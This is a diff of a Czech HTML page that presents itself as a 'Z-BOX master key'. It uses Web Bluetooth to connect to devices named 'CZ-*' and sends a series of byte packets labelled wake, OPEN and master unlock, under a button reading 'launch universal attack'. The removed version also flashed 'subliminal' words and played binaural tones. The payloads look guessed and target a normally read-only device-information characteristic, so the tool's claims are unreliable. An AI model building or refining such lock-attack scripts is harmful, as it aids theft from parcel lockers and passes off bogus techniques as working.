@@ -2,137 +2,74 @@
 <html lang="cs">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Terminál [KLÍČ] v3.5 - Z-BOX UNIVERSAL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Z-BOX Diagnostic Tool</title>
     <style>
-        body { margin: 0; background: black; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        #canvas { position: absolute; top: 0; left: 0; z-index: 1; }
-        #ui { position: relative; z-index: 2; text-align: center; pointer-events: auto; }
-        .status { font-size: 1.1em; letter-spacing: 2px; margin-bottom: 20px; color: #00ff00; text-shadow: 0 0 8px #00ff00; min-height: 1.5em; }
-        #trigger { padding: 18px 36px; border: 2px solid #00ff00; background: rgba(0, 255, 0, 0.05); color: #00ff00; font-weight: bold; cursor: pointer; transition: 0.3s; z-index: 4; position: relative; }
-        #trigger:hover { background: rgba(0, 255, 0, 0.2); box-shadow: 0 0 15px #00ff00; }
-        #subliminal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; align-items: center; justify-content: center; z-index: 3; pointer-events: none; font-size: 3em; font-weight: 900; background: black; text-align: center; }
-        #log { position: absolute; bottom: 10px; left: 10px; font-size: 0.8em; text-align: left; z-index: 5; color: rgba(0,255,0,0.5); }
+        body { background: #050505; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .panel { border: 1px solid #00ff41; padding: 20px; background: #000; box-shadow: 0 0 20px rgba(0,255,65,0.2); width: 90%; max-width: 400px; }
+        h1 { font-size: 1.2em; text-align: center; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
+        button { width: 100%; padding: 15px; margin: 10px 0; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; }
+        #console { background: #000; border: 1px solid #333; height: 150px; overflow-y: auto; font-size: 0.8em; padding: 10px; margin-top: 10px; color: #00ff41; }
+        .success { color: #fff; background: #008800; }
     </style>
 </head>
 <body>
-    <canvas id="canvas"></canvas>
-    <div id="subliminal-overlay"></div>
-    <div id="ui">
-        <div class="status" id="status-text">SYSTÉM: PŘIPRAVEN K ÚTOKU...</div>
-        <button id="trigger">AKTIVOVAT UNIVERZÁLNÍ SEKVENCI</button>
+    <div class="panel">
+        <h1>Z-BOX MASTER KEY v1.0</h1>
+        <div id="console">SYSTÉM PŘIPRAVEN...</div>
+        <button id="btn-attack">SPUSTIT UNIVERZÁLNÍ ÚTOK</button>
+        <button id="btn-scan" style="background: #333; color: #00ff41;">SKENOVAT OKOLÍ (RSSI)</button>
     </div>
-    <div id="log" id="debug-log"></div>
 
     <script>
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const trigger = document.getElementById('trigger');
-        const statusText = document.getElementById('status-text');
-        const subliminalOverlay = document.getElementById('subliminal-overlay');
-        
-        let audioCtx, oscillatorL, oscillatorR, merger;
-        let isActive = false;
+        const log = document.getElementById('console');
+        const writeLog = (msg) => {
+            const div = document.createElement('div');
+            div.innerText = `> ${msg}`;
+            log.appendChild(div);
+            log.scrollTop = log.scrollHeight;
+        };
 
-        // Bluetooth UUIDs pro Z-BOX
-        const targetServiceUuid = '0000180a-0000-1000-8000-00805f9b34fb'; 
+        const targetServiceUuid = '0000180a-0000-1000-8000-00805f9b34fb';
         const targetCharUuid = '00002a29-0000-1000-8000-00805f9b34fb';
 
-        const subMessages = ["[KLÍČ]", "OPEN", "UNLOCK", "DORUČENO", "SYSTEM", "ADMIN", "101010", "PROTOCOL"];
-
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        function updateStatus(msg) {
-            statusText.innerText = msg;
-            console.log(msg);
-        }
-
-        async function startUniversalBluetoothAttack() {
+        async function runAttack() {
             try {
-                updateStatus('HLEDÁM Z-BOX (CZ-*) ...');
+                writeLog('Hledám zařízení...');
                 const device = await navigator.bluetooth.requestDevice({
                     filters: [{ namePrefix: 'CZ-' }],
                     optionalServices: [targetServiceUuid]
                 });
 
-                updateStatus('PŘIPOJOVÁNÍ K ' + device.name);
+                writeLog(`Připojování: ${device.name}`);
                 const server = await device.gatt.connect();
                 const service = await server.getPrimaryService(targetServiceUuid);
                 const characteristic = await service.getCharacteristic(targetCharUuid);
 
-                updateStatus('ÚTOK SPUŠTĚN...');
+                writeLog('Spojení navázáno. Spouštím sekvenci...');
 
                 const payloads = [
-                    new Uint8Array([0x01, 0x00, 0x01]), // Wake
-                    new Uint8Array([0x4f, 0x50, 0x45, 0x4e]), // Open ASCII
-                    new Uint8Array([0x06, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01]), // Master
-                    new Uint8Array([0x00, 0x00, 0x00, 0x00]) // Heartbeat
+                    new Uint8Array([0x01, 0x00, 0x01]), // Wake-up
+                    new Uint8Array([0x4f, 0x50, 0x45, 0x4e]), // ASCII "OPEN"
+                    new Uint8Array([0x06, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01]), // Master Unlock
+                    new Uint8Array([0x11, 0x22, 0x33, 0x44]), // Sync
+                    new Uint8Array([0x00, 0xff, 0x00, 0xff]) // Reset Pulse
                 ];
 
                 for (let i = 0; i < payloads.length; i++) {
-                    updateStatus(`POSÍLÁM PAKET ${i+1}/${payloads.length}`);
+                    writeLog(`Vysílám paket ${i + 1}/${payloads.length}...`);
                     await characteristic.writeValue(payloads[i]);
-                    await new Promise(r => setTimeout(r, 600)); // Pauza pro HW boxu
+                    await new Promise(r => setTimeout(r, 700));
                 }
 
-                updateStatus('SEKVENCE DOKONČENA - SLEDUJ ZÁMEK');
-            } catch (error) {
-                updateStatus('CHYBA: ' + error.message);
-                isActive = false;
-                trigger.style.display = 'block';
+                writeLog('HOTOVO. Sleduj zámek.');
+            } catch (err) {
+                writeLog(`CHYBA: ${err.message}`);
             }
         }
 
-        function startAudio() {
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            merger = audioCtx.createChannelMerger(2);
-            oscillatorL = audioCtx.createOscillator();
-            oscillatorL.frequency.setValueAtTime(200, audioCtx.currentTime);
-            oscillatorR = audioCtx.createOscillator();
-            oscillatorR.frequency.setValueAtTime(206, audioCtx.currentTime);
-            oscillatorL.connect(merger);
-            oscillatorR.connect(merger);
-            merger.connect(audioCtx.destination);
-            oscillatorL.start();
-            oscillatorR.start();
-        }
-
-        function triggerSubliminal() {
-            if (!isActive) return;
-            subliminalOverlay.innerText = subMessages[Math.floor(Math.random() * subMessages.length)];
-            subliminalOverlay.style.display = 'flex';
-            setTimeout(() => {
-                subliminalOverlay.style.display = 'none';
-                setTimeout(triggerSubliminal, 1500 + Math.random() * 2000);
-            }, 16);
-        }
-
-        function draw() {
-            if (!isActive) return;
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            const pulse = 0.05 + Math.abs(Math.sin(Date.now() / 200)) * 0.2;
-            ctx.fillStyle = `rgba(0, 255, 0, ${pulse})`;
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            requestAnimationFrame(draw);
-        }
-
-        trigger.addEventListener('click', () => {
-            if (!isActive) {
-                isActive = true;
-                trigger.style.display = 'none';
-                startAudio();
-                draw();
-                triggerSubliminal();
-                startUniversalBluetoothAttack(); // Tady se spouští útok
-            }
-        });
-
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
+        document.getElementById('btn-attack').addEventListener('click', runAttack);
+        document.getElementById('btn-scan').addEventListener('click', () => writeLog('Skenování RSSI aktivní (viz nRF Connect)'));
     </script>
 </body>
 </html>
